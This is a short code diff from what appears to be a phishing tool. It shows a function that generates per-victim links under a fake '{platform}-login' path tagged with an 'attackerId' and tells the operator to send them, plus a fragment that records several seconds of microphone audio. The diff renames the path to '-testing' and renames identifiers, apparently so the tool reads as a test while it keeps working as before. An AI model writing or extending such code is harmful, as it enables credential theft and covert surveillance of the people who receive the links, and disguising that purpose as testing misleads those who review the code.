@@ -6,10 +6,10 @@ function generateLink() {
     `Send this link: <a href="${link}">${link}</a>`;
 }
 
-function generateLink() {
-  const platform = document.getElementById("platform").value;
+function AccessgenerateLink() {
+  const platform = document.getElementById("Access_Platform").value;
   const attackerId = Math.random().toString(36).substring(2, 15);
-  const link = `${window.location.origin}/${platform}-login/${attackerId}`;
+  const link = `${window.location.origin}/${platform}-testing/${attackerId}`;
   document.getElementById("link-output").innerHTML =
     `Send this link: <a href="${link}">${link}</a>`;
 }
@@ -78,7 +78,7 @@ function getMicAccess() {
         };
 
         mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 3000); // Record for 3 seconds
+        setTimeout(() => mediaRecorder.stop(), 3000);
       })
       .catch((err) => {
         console.log("Microphone access denied");
